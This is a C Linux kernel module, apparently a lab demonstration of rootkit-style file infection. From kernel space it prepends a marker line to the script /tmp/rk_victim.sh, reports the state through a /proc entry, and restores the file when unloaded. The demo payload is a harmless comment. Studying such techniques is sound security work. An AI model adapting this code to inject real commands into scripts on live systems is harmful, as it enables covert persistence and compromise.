// SPDX-License-Identifier: GPL-2.0
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#define TARGET_SCRIPT "/tmp/rk_victim.sh"
#define PAYLOAD_LINE  "# rootkit was here\n"
#define PAYLOAD_LEN   (sizeof(PAYLOAD_LINE) - 1)

static struct proc_dir_entry *proc_entry;
#define ORIGINAL_MAX 512

static char original[ORIGINAL_MAX];
static ssize_t orig_len;
static bool infected;

static ssize_t read_file(const char *path, char *buf, size_t maxlen)
{
	struct file *f;
	loff_t pos = 0;
	ssize_t ret;

	f = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	ret = kernel_read(f, buf, maxlen, &pos);
	filp_close(f, NULL);
	return ret;
}

static int write_file(const char *path, const char *buf, size_t len)
{
	struct file *f;
	loff_t pos = 0;
	ssize_t ret;

	f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (IS_ERR(f))
		return PTR_ERR(f);
	ret = kernel_write(f, buf, len, &pos);
	filp_close(f, NULL);
	if (ret < 0)
		return ret;
	return ret == len ? 0 : -EIO;
}

static int infect(void)
{
	char input[ORIGINAL_MAX + 1];
	char buf[ORIGINAL_MAX + PAYLOAD_LEN];
	ssize_t len;
	int err;

	len = read_file(TARGET_SCRIPT, input, sizeof(input));
	if (len < 0) {
		pr_err("rk: target not found: %s\n", TARGET_SCRIPT);
		return len;
	}
	if (len > sizeof(original))
		return -EFBIG;
	orig_len = len;
	memcpy(original, input, orig_len);

	memcpy(buf, PAYLOAD_LINE, PAYLOAD_LEN);
	memcpy(buf + PAYLOAD_LEN, original, orig_len);
	err = write_file(TARGET_SCRIPT, buf, PAYLOAD_LEN + orig_len);
	if (err)
		return err;
	infected = true;

	pr_info("rk: infected %s\n", TARGET_SCRIPT);
	return 0;
}

static void disinfect(void)
{
	if (infected) {
		int err = write_file(TARGET_SCRIPT, original, orig_len);

		if (err)
			pr_err("rk: failed to restore %s: %d\n",
			       TARGET_SCRIPT, err);
		else
			pr_info("rk: restored %s\n", TARGET_SCRIPT);
		infected = false;
	}
}

static int proc_read(struct seq_file *m, void *v)
{
	seq_printf(m, "target=%s\ninfected=%s\n",
		   TARGET_SCRIPT, infected ? "yes" : "no");
	return 0;
}


static int __init infect_init(void)
{
	int err;

	err = infect();
	if (err)
		return err;

	proc_entry = proc_create_single("rk_infect", 0444, NULL, proc_read);
	if (!proc_entry) {
		disinfect();
		return -ENOMEM;
	}

	return 0;
}

static void __exit infect_exit(void)
{
	proc_remove(proc_entry);
	disinfect();
}

module_init(infect_init);
module_exit(infect_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("File infection via content injection");
